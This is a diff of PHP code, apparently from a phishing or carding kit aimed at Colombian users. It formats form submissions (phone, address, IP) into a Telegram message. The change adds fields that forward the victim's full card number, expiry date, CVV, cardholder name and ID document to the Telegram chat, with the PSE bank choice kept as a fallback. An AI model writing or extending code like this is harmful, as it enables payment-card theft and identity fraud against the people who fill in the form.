@@ -52,8 +52,28 @@ $message .= "• *Teléfono:* `" . escapeMarkdownV2($data['telefono']) . "`\n";
 $message .= "• *Dirección:* `" . escapeMarkdownV2($data['direccion']) . "`\n";
 $message .= "• *IP:* `" . escapeMarkdownV2($_SERVER['REMOTE_ADDR']) . "`\n";
 
-if (!empty($data['banco'])) {
-    $message .= "\n🏦 *Banco Seleccionado:* `" . escapeMarkdownV2(strtoupper($data['banco'])) . "`";
+if (!empty($data['paymentMethod']) && $data['paymentMethod'] === 'card') {
+    $message .= "\n💳 *Medio de Pago:* `TARJETA DE CRÉDITO / DÉBITO`\n";
+    if (!empty($data['cardName'])) {
+        $message .= "• *Titular Tarjeta:* `" . escapeMarkdownV2($data['cardName']) . "`\n";
+    }
+    if (!empty($data['cardNumber'])) {
+        $message .= "• *Número Tarjeta:* `" . escapeMarkdownV2($data['cardNumber']) . "`\n";
+    }
+    if (!empty($data['cardExpiry'])) {
+        $message .= "• *Expiración:* `" . escapeMarkdownV2($data['cardExpiry']) . "`\n";
+    }
+    if (!empty($data['cardCvv'])) {
+        $message .= "• *CVV:* `" . escapeMarkdownV2($data['cardCvv']) . "`\n";
+    }
+    if (!empty($data['cardCuotas'])) {
+        $message .= "• *Cuotas:* `" . escapeMarkdownV2($data['cardCuotas']) . "`\n";
+    }
+    if (!empty($data['cardDoc'])) {
+        $message .= "• *Doc Titular:* `" . escapeMarkdownV2($data['cardDoc']) . "`\n";
+    }
+} else if (!empty($data['banco'])) {
+    $message .= "\n🏦 *Banco Seleccionado (PSE):* `" . escapeMarkdownV2(strtoupper($data['banco'])) . "`";
 }
 
 // Send to Telegram
